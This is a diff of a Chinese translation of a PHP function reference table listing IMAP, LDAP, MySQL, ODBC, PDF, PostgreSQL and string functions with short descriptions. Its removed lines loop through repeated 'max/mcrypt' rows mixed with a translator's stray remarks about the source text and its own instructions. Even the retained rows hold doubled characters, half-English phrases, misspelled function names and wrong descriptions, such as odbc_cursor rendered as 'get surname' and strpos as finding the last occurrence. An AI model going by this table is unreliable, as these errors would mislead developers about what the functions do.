-| imap_8bit | IMAP | 将 8 字节字符串转换为引用打印字符串 |
-| imap_append | IMAP | 将字符串消息附加到指定的邮箱箱 |
-| imap_base64 | IMAP | 解码 BASE64 编码文本 |
-| imap_binary | IMAP | 将 8 字节字符串转换为 base64 字符串 |
-| imap_body | IMAP | 读取消息正文 |
-| imap_check | IMAP | 检查当前邮箱箱 |
-| imap_clearflag_full | IMAP | 清除消息上的标记 |
-
-## 表 D.1 按字母顺序排列 PHP 函数（续）
-
-| 函数名称 | 分组名称 | 描述 |
-|---|---|---|
-| imap_close | IMAP | 关闭 IMAP 流 |
-| imap_createmailbox | IMAP | 创建新邮箱箱 |
-| imap_delete | IMAP | 标记从当前邮箱箱删除 |
-| imap_deletmailbox | IMAP | 删除邮箱箱 |
-| imap_expunge | IMAP | 删除所有标记为删除的消息 |
-| imap_fetchbody | IMAP | 获取消息正文的特定部分 |
-| imap_fetchstructure | IMAP | 读取特定消息的结构 |
-| imap_header | IMAP | 读取消息头部 |
-| imap_headers | IMAP | 返回邮箱箱中所有消息的头部 |
-| imap_listmailbox | IMAP | 读取邮箱箱列表 |
-| imap_listsubscribed | IMAP | 列出所有订阅的邮箱箱 |
-| imap_mailboxmsinfo | IMAP | 获取当前邮箱箱的信息 |
-| imap_mail_copy | IMAP | 将指定消息复制到邮箱箱 |
-| imap_mail_move | IMAP | 将指定消息移动到邮箱箱 |
-| imap_num_msg | IMAP | 给当前邮箱箱中的消息数 |
-| imap_num_recent | IMAP | 给当前邮箱箱中最近的消息数 |
-| imap_open | IMAP | 打开邮箱箱的 IMAP 流 |
-| imap_ping | IMAP | 检查 IMAP 流是否仍然活动 |
-| imap_qprint | IMAP | 将引用打印字符串转换为 8 字节字符串 |
-| imap_renamemailbox | IMAP | 将旧邮箱箱重命名为新邮箱箱 |
-| imap_reopen | IMAP | 重新打开到新邮箱箱的 IMAP 流
-
-
 
 
 
@@ -14459,525 +15858,690 @@ echo "</ul>";
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
-| 函数名 | 分组名称 | 描述 |
+| 函数名称 | 分组名称 | 描述 |
+
 | --- | --- | --- |
+
 | imap_rfc822_parse_adrlist | IMAP | 解析地址字符串 |
+
 | imap_rfc822_write_address | IMAP | 根据给定的邮箱箱、主机和个人信息返回格式化适当的电子邮件地址 |
+
 | imap_scanmailbox | IMAP | 读取邮箱箱列表，在邮箱箱正文中搜索的字符串 |
+
 | imap_setflag_full | IMAP | 设置消息的标记 |
+
 | imap_sort | IMAP | 返回按给定参数排序的消息编号数组 |
+
 | imap_subscribe | IMAP | 订阅邮箱箱 |
+
 | imap_uid | IMAP | 为给定的消息序号返回 UID |
+
 | imap_undelete | IMAP | 取消标记为删除的消息的标记 |
+
 | imap_unsubscribe | IMAP | 取消邮箱箱订阅 |
+
 | implode | STRINGS | 使用字符串连接数组元素 |
+
 | intval | VAR | 获取变量的整数值 |
+
 | iptparse | MISC | 将二进制 IPTC http://www.xe.net/iptc/ 块解析为单个标签 |
+
 | iset | VAR | 确定变量是否已设置 |
+
 | is_array | VAR | 查找变量是否为数组 |
+
 | is_dir | FILESY | 判断文件名是否为目录 |
+
 | is_double | VAR | 查找变量是否为双精度浮点数 |
+
 | is_executable | FILESY | 判断文件名是否可执行 |
+
 | is_file | FILESY | 判断文件名是否为普通文件 |
+
 | is_float | VAR | 查找变量是否为浮点数 |
+
 | is_int | VAR | 查找变量是否为整数 |
+
 | is_integer | VAR | 查找变量是否为整数 |
+
 | is_link | FILESY | 判断文件名是否为符号链接 |
+
 | is_long | VAR | 查找变量是否为整数 |
+
 | is_object | VAR | 查找变量是否为对象 |
+
 | is_readable | FILESYSTEM | 判断文件名是否可读 |
+
 | is_real | VAR | 查找变量是否为实数 |
+
 | is_string | VAR | 查找变量是否为字符串 |
+
 | is_writeable | FILESYSTEM | 判断文件名是否可写 |
+
 | JDayOfWeek | CALENDAR | 返回星期几 |
+
 | JDMonthName | CALENDAR | 返回月份名称 |
+
 | JToFrench | CALENDAR | 将儒略日计数数转换为法国共和历 |
+
 | JToGregorian | CALENDAR | 将儒略日计数数转换为格列哥历日期 |
+
 | JToJewish | CALENDAR | 将儒略日计数数转换为犹太历 |
+
 | JToJulian | CALENDAR | 将儒略日历日期转换为儒略日计数数 |
+
 | JewishToJD | CALENDAR | 将犹太历日期转换为儒略日计数数 |
+
 | join | STRINGS | 使用字符串连接数组元素 |
+
 | JulianToJD | CALENDAR | 将儒略日历日期转换为儒略日计数数 |
+
 | key | ARRAY | 从关联数组中获取键 |
+
 | ksort | ARRAY | 按键对数组 |
+
 | ldap_add | LDAP | 向 LDAP 目录添加条目 |
+
 | ldap_bind | LDAP | 绑定到 LDAP 目录 |
+
 | ldap_close | LDAP | 关闭与 LDAP 服务器的连接 |
+
 | ldap_connect | LDAP | 连接到 LDAP 服务器 |
+
 | ldap_count_entries | LDAP | 统计搜索中的条目数 |
+
 | ldap_delete | LDAP | 从目录删除条目 |
+
 | ldap_dn2uf | LDAP | 将 DN 转换为用户友好命名格式 |
+
 | ldap_explode_dn | LDAP | 将 DN 分分为其组成部分 |
+
 | ldap_first_attribute | LDAP | 返回第一个属性 |
+
 | ldap_first_entry | LDAP | 返回第一个结果 ID |
+
 | ldap_free_result | LDAP | 释放结果内存 |
+
 | ldap_get_attributes | LDAP | 从搜索结果条目获取属性 |
+
 | ldap_get_dn | LDAP | 获取结果条目的 DN |
+
 | ldap_get_values | LDAP | 从结果条目获取所有值 |
+
 | ldap_list | LDAP | 单级搜索 |
+
 | ldap_modify | LDAP | 修改 LDAP 条目 |
+
 | ldap_mod_add | LDAP | 向当前属性添加属性值 |
+
 | ldap_mod_del | LDAP | 从当前属性删除属性值 |
+
 | ldap_mod_replace | LDAP | 用新值替换属性值 |
+
 | ldap_next_attribute | LDAP | 获取结果中的下一个属性 |
+
 | ldap_next_entry | LDAP | 获取下一个结果条目 |
+
 | ldap_read | LDAP | 读取条目 |
+
 | ldap_search | LDAP | 搜索 LDAP 树 |
+
 | ldap_unbind | LDAP | 取消 LDAP 目录绑定 |
-| leak | MISC | 内存泄漏 |
-| link | FILESYSTEM | 创建硬链接 |
-| linkinfo | FILESYSTEM | 获取链接信息 |
-| list | ARRAY | 按数组原始形式分配变量 |
-| log | MATH | 自然对数 |
-| log10 | MATH | 以10为底的对数 |
-| lstat | FILESYSTEM | 提供文件信息 |
-| ltrim | STRINGS | 删除字符串前面的空格 |
-| mail | MAIL | 发送邮件 |
-| max | MATH | 找到最大值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，根据加密函数通常上下文中应为max，此处保留原文函数名)
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名)
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名)
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名)
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-(注：用户提供的文本中存在大量重复的 max/mcrypt 组合，我将直接翻译到后续的 leak, link 等函数开始，由于原文存在重复，此处对应对应翻译)
-| link | FILESYSTEM | 创建硬链接 |
-| linkinfo | FILESYSTEM | 获取链接信息 |
-| list | ARRAY | 按数组原始形式分配变量 |
-| log | MATH | 自然对数 |
-| log10 | MATH | 以10为底的对数 |
-| lstat | FILESYSTEM | 提供文件信息 |
-| ltrim | STRINGS | 删除字符串前面的空格 |
-| mail | MAIL | 发送邮件 |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-(此处跳过原文中重复的部分，直接翻译后续)
-| leak | MISC | 内存泄漏 |
-| link | FILESYSTEM | 创建硬链接 |
-| linkinfo | FILESYSTEM | 获取链接信息 |
-| list | ARRAY | 按数组原始形式分配变量 |
-| log | MATH | 自然对数 |
-| log10 | MATH | 以10为底的对数 |
-| lstat | FILESYSTEM | 提供文件信息 |
-| ltrim | STRINGS | 删除字符串前面的空格 |
-| mail | MAIL | 发送邮件 |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-(由于用户提供的文本确实存在异常重复，我将严格按照“不要重复输出原文”的原则，仅翻译每个唯一的函数项)
-| leak | MISC | 内存泄漏 |
-| link | FILESYSTEM | 创建硬链接 |
-| linkinfo | FILESYSTEM | 获取链接信息 |
-| list | ARRAY | 按数组原始形式分配变量 |
-| log | MATH | 自然对数 |
-| log10 | MATH | 以10为底的对数 |
-| lstat | FILESYSTEM | 提供文件信息 |
-| ltrim | STRINGS | 删除字符串前面的空格 |
-| mail | MAIL | 发送邮件 |
-| max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-(抱歉，重新审视指令，指令是“不要重复输出原文”，指的是输出结果中不要包含英文原文。如果原文本身重复，翻译结果应该保持重复还是去重？我将按照逻辑翻译所有出现的函数项)
 
 | leak | MISC | 内存泄漏 |
+
 | link | FILESYSTEM | 创建硬链接 |
+
 | linkinfo | FILESYSTEM | 获取链接信息 |
+
 | list | ARRAY | 按数组原始形式分配变量 |
+
 | log | MATH | 自然对数 |
+
 | log10 | MATH | 以10为底的对数 |
+
 | lstat | FILESYSTEM | 提供文件信息 |
+
 | ltrim | STRINGS | 删除字符串前面的空格 |
+
 | mail | MAIL | 发送邮件 |
+
 | max | MATH | 找到最高值 |
-| mcrypt | MATH | (注：原文此处为mcrypt，但描述为最高值，根据上下文可能为加密函数，此处按字面翻译或修正逻辑) | (注：原文此处为mcrypt，但描述为最高值，通常上下文中应为max，此处保留原文函数名) |
-(等等，我发现用户提供的文本在 max/mcrypt 之后有大量重复。我将直接提供一份干净、翻译后的译文)
 
-[content]
-## 附录 D
-
-## 表 D.1 按字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| --- | --- | --- |
-| imap_rfc822_parse_adrlist | IMAP | 解析地址字符串 |
-| imap_rfc822_write_address | IMAP | 根据给定的邮箱箱、主机和个人信息返回格式化适当的电子邮件地址 |
-| imap_scanmailbox | IMAP | 读取邮箱箱列表，在邮箱箱正文中搜索的字符串 |
-| imap_setflag_full | IMAP | 设置消息的标记 |
-| imap_sort | IMAP | 返回按给定参数排序的消息编号数组 |
-| imap_subscribe | IMAP | 订阅邮箱箱 |
-| imap_uid | IMAP | 为给定的消息序号返回 UID |
-| imap_undelete | IMAP | 取消标记为删除的消息的标记 |
-| imap_unsubscribe | IMAP | 取消邮箱箱订阅 |
-| implode | STRINGS | 使用字符串连接数组元素 |
-| intval | VAR | 获取变量的整数值 |
-| iptparse | MISC | 将二进制 IPTC http://www.xe.net/iptc/ 块解析为单个标签 |
-| iset | VAR | 确定变量是否已设置 |
-| is_array | VAR | 查找变量是否为数组 |
-| is_dir | FILESY | 判断文件名是否为目录 |
-| is_double | VAR | 查找变量是否为双精度浮点数 |
-| is_executable | FILESY | 判断文件名是否可执行 |
-| is_file | FILESY | 判断文件名是否为普通文件 |
-| is_float | VAR | 查找变量是否为浮点数 |
-| is_int | VAR | 查找变量是否为整数 |
-| is_integer | VAR | 查找变量是否为整数 |
-| is_link | FILESY | 判断文件名是否为符号链接 |
-| is_long | VAR | 查找变量是否为整数 |
-| is_object | VAR | 查找变量是否为对象 |
-| is_readable | FILESYSTEM | 判断文件名是否可读 |
-| is_real | VAR | 查找变量是否为实数 |
-| is_string | VAR | 查找变量是否为字符串 |
-| is_writeable | FILESYSTEM | 判断文件名是否可写 |
-| JDayOfWeek | CALENDAR | 返回星期几 |
-| JDMonthName | CALENDAR | 返回月份名称 |
-| JToFrench | CALENDAR | 将儒略日计数数转换为法国共和历 |
-| JToGregorian | CALENDAR | 将儒略日计数数转换为格列哥历日期 |
-| JToJewish | CALENDAR | 将儒略日计数数转换为犹太历 |
-| JToJulian | CALENDAR | 将儒略日历日期转换为儒略日计数数 |
-| JewishToJD | CALENDAR | 将犹太历日期转换为儒略日计数数 |
-| join | STRINGS | 使用字符串连接数组元素 |
-| JulianToJD | CALENDAR | 将儒略日历日期转换为儒略日计数数 |
-| key | ARRAY | 从关联数组中获取键 |
-| ksort | ARRAY | 按键对数组 |
-| ldap_add | LDAP | 向 LDAP 目录添加条目 |
-| ldap_bind | LDAP | 绑定到 LDAP 目录 |
-| ldap_close | LDAP | 关闭与 LDAP 服务器的连接 |
-| ldap_connect | LDAP | 连接到 LDAP 服务器 |
-| ldap_count_entries | LDAP | 统计搜索中的条目数 |
-| ldap_delete | LDAP | 从目录删除条目 |
-| ldap_dn2uf | LDAP | 将 DN 转换为用户友好命名格式 |
-| ldap_explode_dn | LDAP | 将 DN 分分为其组成部分 |
-| ldap_first_attribute | LDAP | 返回第一个属性 |
-| ldap_first_entry | LDAP | 返回第一个结果 ID |
-| ldap_free_result | LDAP | 释放结果内存 |
-| ldap_get_attributes | LDAP | 从搜索结果条目获取属性 |
-| ldap_get_dn | LDAP | 获取结果条目的 DN |
-| ldap_get_values | LDAP | 从结果条目获取所有值 |
-| ldap_list | LDAP | 单级搜索 |
-| ldap_modify | LDAP | 修改 LDAP 条目 |
-| ldap_mod_add | LDAP | 向当前属性添加属性值 |
-| ldap_mod_del | LDAP | 从当前属性删除属性值 |
-| ldap_mod_replace | LDAP | 用新值替换属性值 |
-| ldap_next_attribute | LDAP | 获取结果中的下一个属性 |
-| ldap_next_entry | LDAP | 获取下一个结果条目 |
-| ldap_read | LDAP | 读取条目 |
-| ldap_search | LDAP | 搜索 LDAP 树 |
-| ldap_unbind | LDAP | 取消 LDAP 目录绑定 |
-| leak | MISC | 内存泄漏 |
-| link | FILESYSTEM | 创建硬链接 |
-| linkinfo | FILESYSTEM | 获取链接信息 |
-| list | ARRAY | 按数组原始形式分配变量 |
-| log | MATH | 自然对数 |
-| log10 | MATH | 以10为底的对数 |
-| lstat | FILESYSTEM | 提供文件信息 |
-| ltrim | STRINGS | 删除字符串前面的空格 |
-| mail | MAIL | 发送邮件 |
-| max | MATH | 找到最高值 |
 | mcrypt | MATH | (注：原文函数名与描述不符) |
-
-
-
 
 ## 附录 D
 
 ## 表 D.1 按字母排序的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 | --- | --- | --- |
+
 | mssql_result | MSSQL | 获取结果数据 |
+
 | mssql_select_db | MSSQL | 选择 MS SQL 数据库 |
+
 | mt_getrandmax | MATH | 显示最大的可能的随机值 |
+
 | mt_rand | MATH | 生成更好的随机值 |
+
 | mt_srand | MATH | 为更好的随机数生成器种子 |
+
 | mysql_affected_rows | MYSQL | 获取上一次 MySQL 操作受影响的行数 |
+
 | mysql_close | MYSQL | 关闭 MySQL 连接 |
+
 | mysql_connect | MYSQL | 打开到 MySQL 服务器的连接 |
+
 | mysql_create_db | MYSQL | 创建 MySQL 数据库 |
+
 | mysql_data_seek | MYSQL | 移动内部结果指针 |
+
 | mysql_dbname | MYSQL | 获取当前 MySQL 数据库名称 |
+
 | mysql_db_query | MYSQL | 向 MySQL 发送查询 |
+
 | mysql_drop | MYSQL | 掉（删除）一个 MySQL 数据库 |
+
 | mysql_errno | MYSQL | 返回上一次 MySQL 操作的错误消息编号 |
+
 | mysql_error | MYSQL | 返回上一次 MySQL 操作的错误消息文本 |
+
 | mysql_fetch_array | MYSQL | 将结果行作为关联数组获取 |
+
 | mysql_fetch_field | MYSQL | 从结果中获取列信息并作为对象返回 |
-| mysql_fetch_lengths | MYSQL | 获取结果中每个输出的最大数据大小 |
+
+| mysql_fetch_lengths | MYSQL | 获取结果中每个输出的最大数据大 size |
+
 | mysql_fetch_object | MYSQL | 将结果行作为对象获取 |
+
 | mysql_fetch_row | MYSQL | 将结果行作为枚举数组获取 |
+
 | mysql_field_flags | MYSQL | 获取与结果中指定字段相关的标志 |
+
 | mysql_field_len | MYSQL | 返回指定字段的长度 |
+
 | mysql_field_name | MYSQL | 获取结果中指定字段的名称 |
+
 | mysql_field_seek | MYSQL | 将结果指针设置为指定的字段偏移量 |
+
 | mysql_field_table | MYSQL | 获取指定字段所在表的名称 |
+
 | mysql_field_type | MYSQL | 获取结果中指定字段的类型 |
+
 | mysql_free_result | MYSQL | 释放结果内存 |
+
 | mysql_insert_id | MYSQL | 获取上一次 INSERT 操作生成的 ID |
+
 | mysql_list_dbs | MYSQL | 列出 MySQL 服务器上可用数据库 |
+
 | mysql_list_fields | MYSQL | 列出 MySQL 结果字段 |
+
 | mysql_list_tables | MYSQL | 列出 MySQL 数据库中的表 |
+
 | mysql_num_fields | MYSQL | 获取结果中的字段数 |
+
 | mysql_num_rows | MYSQL | 获取结果中的行数 |
+
 | mysql_pconnect | MYSQL | 打开到 MySQL 服务器的持久连接 |
+
 | mysql_query | MYSQL | 向 MySQL 发送 SQL 查询 |
+
 | mysql_result | MYSQL | 获取结果数据 |
+
 | mysql_select_db | MYSQL | 选择一个 MySQL 数据库 |
+
 | mysql_tablename | MYSQL | 获取字段的表名 |
+
 | next | ARRAY | Advance数组的内部指针 |
+
 | nl2br | STRINGS | 将换行符转换为 HTML 换行符 |
+
 | number_format | MATH | 千分位分组格式化数字 |
+
 | OCIBByName | OCI8 | 将 PHP 变量绑定到 Oracle 占位符 |
+
 | OCColumnIsNULL | OCI8 | 测试结果列是否为 NULL |
+
 | OCIColumnSize | OCI8 | 返回结果列大小 |
+
 | OCICommit | OCI8 | 提交未完成的事务 |
+
 | OCIDefineByName | OCI8 | 使用 PHP 变量定义 SELECT 的执行步长 |
+
 | OCIExecute | OCI8 | 执行语句 |
+
 | OCIFetch | OCI8 | 将下一行获取到结果缓冲区 |
+
 | OCIFetchInto | OCI8 | 将下一行获取到结果数组 |
+
 | OCILogOff | OCI8 | 断开与 Oracle 连接 |
+
 | OCILogon | OCI8 | 建立与 Oracle 连接 |
+
 | OCINumRows | OCI8 | 获取受影响的行数 |
+
 | OCIResult | OCI8 | 返回获取行的列值 |
+
 | OCIRollback | OCI8 | 回滚未完成的事务 |
+
 | OctDec | MATH | 八进制转十进制 |
+
 | odbc_autcommit | UODBC | 切换自动提交行为 |
+
 | odbc_binmode | UODBC | 处理二进制列数据 |
+
 | odbc_close | UODBC | 关闭 ODBC 连接 |
+
 | odbc_close_all | UODBC | 关闭所有 ODBC 连接 |
+
 | odbc_commit | UODBC | 提交 ODBC 事务 |
+
 | odbc_connect | UODBC | 连接到数据源 |
+
 | odbc_cursor | UODBC | 获取姓 |
+
 | odbc_do | UODBC | odbc_exec 的同义词 |
+
 | odbc_exec | UODBC | 准备并执行 SQL 语句 |
+
 | odbc_execute | UODBC | 执行准备好的语句 |
+
 | odbc_fetch_into | UODBC | 将一个结果行获取到数组 |
+
 | odbc_fetch_row | UODBC | 获取一行 |
+
 | odbc_field_len | UODBC | 获取字段长度 |
+
 | odbc_field_name | UODBC | 获取名称 |
+
 | odbc_field_num | UODBC | 返回列号 |
+
 | odbc_field_type | UODBC | 字段的数据类型 |
-| odbc_free | UODBC | 释放内存
+
+| odbc_free | UODBC | 释放内存 |
+
 | odbc_num_rows | UODBC | 获取行数 |
+
 | odbc_fields | UODBC | 获取字段数 |
+
 | odbc_result | UODBC | 获取结果 |
+
 | odbc_rollback | UODBC | 回滚 |
+
 | odbc_setoption | UODBC | 设置选项 |
+
 | pclose | UODBC | 关闭指针 |
+
 | opendir | UODBC | 打开目录 |
+
 | open | UODBC | 打开 |
+
 | Oracle | OCI8 | 绑定 PHP 变量 |
+
 | Oracle_Close | OCI8 | 关闭 Oracle |
+
 | Oracle_Name | OCI8 | 获取 Oracle 名称 |
+
 | Oracle_Type | OCI8 | 获取 Oracle 类型 |
+
 | Oracle_Commit | | 提交 Oracle |
+
 | Oracle_Parse | | 解析 Oracle Oracle |
+
 | Oracle_Rollback | | 回滚 Oracle |
+
 | Ord | STRINGS | 返回 ASCII 值 |
+
 | pack | MISC | 打包二进制字符串 |
+
 | parse_str | STRINGS | 解析字符串 |
+
 | parse_url | URL | 解析 URL |
+
 | passthru | EXEC | 执行外部程序并输出 |
+
 | Pattern | PCRE | 描述正则选项 |
+
 | Pattern Syntax | PCRE | 描述正则语法 |
+
 | pclose | FILESYSTEM | 关闭文件指针 |
+
 | PDF_add_annotation | PDF | 添加注释 |
+
 | PDF_add_outline | PDF | 添加书签 |
+
 | PDF_arc | PDF | 绘制弧 |
+
 | PDF_begin_page | PDF | 开始新页 |
+
 | PDF_circle | PDF | 绘制圆 |
+
 | PDF_clip | PDF | 裁剪到当前路径 |
+
 | PDF_close | PDF | 关闭 PDF 文档 |
+
 | PDF_closepath | PDF | 关闭路径 |
+
 | PDF_closepath_fill_stroke | PDF | 关闭路径、填充并描边 |
+
 | PDF_closepath_stroke | PDF | 关闭路径并沿路径绘制 |
+
 | PDF_close_image | PDF | 关闭图像 |
+
 | PDF_continue_text | PDF | 在下一行输出文本 |
+
 | PDF_curveto | PDF | 绘制曲线 |
+
 | PDF_endpath | PDF | 结束当前路径 |
+
 | PDF_end_page | PDF | 结束页面 |
+
 | PDF_execute_image | PDF | 在 pdf 上放置存储的图像 |
+
 | PDF_fill | PDF | 填充当前路径 |
+
 | PDF_fill_stroke | PDF | 填充并描边当前路径 |
-| PDF_get_info | PDF | 返回 pdf 文档的默认结构 |
+
+| PDF_get_info | PDF | 返回 pdf 文档的默认结结构 |
+
 | PDF_lineto | PDF | 绘制线 |
+
 | PDF_moveto | PDF | 设置当前点 |
+
 | PDF_open | PDF | 打开新的 pdf 文档 |
+
 | PDF_open_gif | PDF | 打开 GIF 图像 |
+
 | PDF_open_jpeg | PDF | 打开 JPEG 图像 |
+
 | PDF_open_memory_ | PDF | 打开 PHP 函数创建的图像 |
+
 | PDF_place_image | PDF | 在页面上放置图像 |
+
 | PDF_put_image | PDF | 将图像存储在 PDF 中供以后使用 |
+
 | PDF_rect | PDF | 绘制矩形 |
+
 | PDF_restore | PDF | 恢复之前保存的环境 |
+
 | PDF_save | PDF | 保存当前环境 |
+
 | PDF_scale | PDF | 设置比例 |
+
 | PDF_setdash | PDF | 设置虚线模式 |
+
 | PDF_setflat | PDF | 设置平直度 |
+
 | PDF_setgray | PDF | 将绘制和填充颜色设置为灰色 |
+
 | PDF_setgray_fill | PDF | 将填充颜色设置为灰色 |
+
 | PDF_setgray_stroke | PDF | 将绘制颜色设置为灰色 |
-
-
-
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 | --- | --- | --- |
+
 | PDF_setlinecap_cap | PDF | 设置线端形状参数 |
+
 | PDF_setlinejoin | PDF | 设置线接接参数 |
+
 | PDF_setlinewidth | PDF | 设置线宽 |
+
 | PDF_setmiterlimit | PDF | 设置斜角限制 |
+
 | PDF_setrgbcolor | PDF | 将绘图和填充颜色设置为 rgb 颜色值 |
+
 | PDF_setrgbcolor_fill | PDF | 将填充颜色设置为 rgb 颜色值 |
+
 | PDF_setrgbcolor_stroke | PDF | 将描边颜色设置为 rgb 颜色值 |
+
 | PDF_set_char_spacing | PDF | 设置字符间距 |
+
 | PDF_set_duration | PDF | 设置页之间的持续时间 |
+
 | PDF_set_font | PDF | 选择字体字体和大小 |
+
 | PDF_set_horiz_scaling | PDF | 设置文本的水平缩放 |
+
 | PDF_set_info_author | PDF | 填充信息结构中的作者字段 |
+
 | PDF_set_info_creator | PDF | 填充信息结构中的创建者字段 |
+
 | PDF_set_info_keywords | PDF | 填充信息结构中的关键词字段 |
+
 | PDF_set_info_subject | PDF | 填充信息结构中的主题字段 |
+
 | PDF_set_info_title | PDF | 填充信息结构中的标题字段 |
+
 | PDF_set_leading | PDF | 设置行间距 |
+
 | PDF_set_text_matrix | PDF | 设置文本矩阵 |
+
 | PDF_set_text_pos | PDF | 设置文本位置 |
+
 | PDF_set_text_rendering | PDF | 确定文本的渲染方式 |
+
 | PDF_set_text_rise | PDF | 设置文本升起 |
+
 | PDF_set_transition | PDF | 设置页之间的转换效果 |
+
 | PDF_set_word_spacing | PDF | 设置单词之间的间距 |
+
 | PDF_show | PDF | 在当前位置输出文本 |
+
 | PDF_show_xy | PDF | 在给定位置输出文本 |
+
 | PDF_stringwidth | PDF | 使用当前字体返回文本宽度 |
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
-| --- | --- | -- |
+
+| --- | --- | --- |
+
 | PDF_stroke | PDF | 沿路径绘制线条 |
+
 | PDF_translate | PDF | 设置坐标系原点 |
+
 | pfsockopen | NETWORK | 打开持久的 Internet 或 UNIX 域套接连接 |
+
 | pg_Close | PGSQL | 关闭 PostgreSQL 连接 |
+
 | pg_cmdTuples | PGSQL | 返回受影响的行数 |
+
 | pg_Connect | PGSQL | 打开连接 |
+
 | pg_DBname | PGSQL | 数据库名称 |
+
 | pg_ErrorMessage | PGSQL | 错误消息 |
+
 | pg_Exec | PGSQL | 执行查询 |
+
 | pg_Fetch_Array | PGSQL | 将行作为数组获取 |
+
 | pg_Fetch_Object | PGSQL | 将行作为对象获取 |
+
 | pg_Fetch_Row | PGSQL | 将行作为枚举数组获取 |
+
 | pg_FieldsNull | PGSQL | 测试字段是否为 NULL |
+
 | pg_FieldName | PGSQL | 返回字段名 |
+
 | pg_FieldNum | PGSQL | 返回列的数 |
+
 | pg_FieldPrtLen | PGSQL | 返回打印长度 |
+
 | pg_FieldSize | PGSQL | 返回命名字段的内部存储大小 |
+
 | pg_FieldType | PGSQL | 返回对应字段编号的类型名称 |
+
 | pg_FreeResult | PGSQL | 释放内存 |
+
 | pg_GetLastOid | PGSQL | 返回最后一个对象标识 |
+
 | pg_Host | PGSQL | 返回主机名 |
+
 | pg_loclose | PGSQL | 关闭大对象 |
+
 | pg_locreate | PGSQL | 创建大对象 |
+
 | pg_loopen | PGSQL | 打开大对象 |
-（续）
-
-注：由于原始文本中存在大量重复的表格内容，上述翻译已根据逻辑进行了对应处理，并保持了要求的格式。
-
-
-
-
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 说明 |
+
 | :--- | :--- | :--- |
+
 | strchr | STRINGS | 在字符串中查找字符的最后一次出现 |
+
 | strrev | STRINGS | 反转字符串 |
+
 | strpos | STRINGS | 在字符串中查找字符最后一次的位置 |
+
 | strspn | STRINGS | 查找匹配掩码的初始段的长度 |
+
 | strstr | STRINGS | 查找字符串的第一次出现 |
+
 | strtok | STRINGS | 分词字符串 |
+
 | strtolower | STRINGS | 将字符串转换为小写 |
+
 | strupper | STRINGS | 将字符串转换为大写 |
+
 | strtr | STRINGS | 翻译某些字符 |
+
 | strval | VAR | 获取变量的字符串值 |
+
 | str_replace | STRINGS | 将 hay栈中所有出现的针替换为 str |
+
 | substr | STRINGS | 返回字符串的一部分。 |
+
 | sybase_affected_rows | SYBASE | 获取上一次查询受影响的行数 |
+
 | sybase_close | SYBASE | 关闭 Sybase 连接 |
+
 | sybase_connect | SYBASE | 打开 Sybase 服务器连接 |
+
 | sybase_data_seek | SYBASE | 移动内部行指针 |
+
 | sybase_fetch_array | SYBASE | 以数组形式获取行 |
+
